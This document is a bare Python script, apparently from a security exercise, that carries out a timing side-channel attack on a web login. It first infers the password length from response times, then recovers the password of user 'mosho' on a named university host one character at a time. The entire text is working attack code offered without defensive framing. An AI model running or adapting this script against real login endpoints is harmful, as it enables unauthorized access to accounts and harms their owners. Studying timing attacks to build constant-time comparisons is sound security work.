```python
import requests
import time
import string

ALPHABET = string.ascii_lowercase
URL = 'http://aoi.ise.bgu.ac.il'
PARAMS = {'user': 'mosho', 'password': ''}
PASSWORD_ASSUMED_MAX_LENGTH = 32
times_by_len = dict()
guessed_password = ''

for pass_length in range(1, PASSWORD_ASSUMED_MAX_LENGTH+1):
    PARAMS['password'] = 'a' * pass_length

    start_time = time.time()
    requests.get(URL, params=PARAMS)
    end_time = time.time()

    times_by_len[pass_length] = end_time - start_time
    print(f'Checking length of {pass_length}: time: {times_by_len[pass_length]}')
    
# Password length is set to the maximum response time from the server.
# This 'max' function returns the key that has the maximum value.
password_length = max(times_by_len, key=times_by_len.get)
```

```python
times_by_len = dict()
guessed_password = ''
success = 0

while not success:
    PARAMS['password'] = 'a' * password_length # Initialize the password with the correct length
    
    for password_index in range(password_length):
        print(f'password_index: {password_index}, guessed_password: {guessed_password}')
        
        for alphabet_index in range(len(ALPHABET)):
            current_letter = ALPHABET[alphabet_index]
            # Replace the character in the current index
            PARAMS['password'] = PARAMS['password'][:password_index] + current_letter + PARAMS['password'][password_index+1:]

            start_time = time.time()
            requests.get(URL, params=PARAMS)
            end_time = time.time()

            times_by_len[current_letter] = end_time - start_time
            
            print(f'{PARAMS["password"]}: {end_time-start_time}')

        letter_in_current_index = max(times_by_len, key=times_by_len.get)
        PARAMS['password'] = PARAMS['password'][:password_index] + letter_in_current_index + PARAMS['password'][password_index+1:]

        guessed_password += letter_in_current_index

    print(f'guessed_password: {guessed_password}')
    success = int(requests.get(URL, params=PARAMS).content)
    print(f'success: {requests.get(URL, params=PARAMS).content}')
```
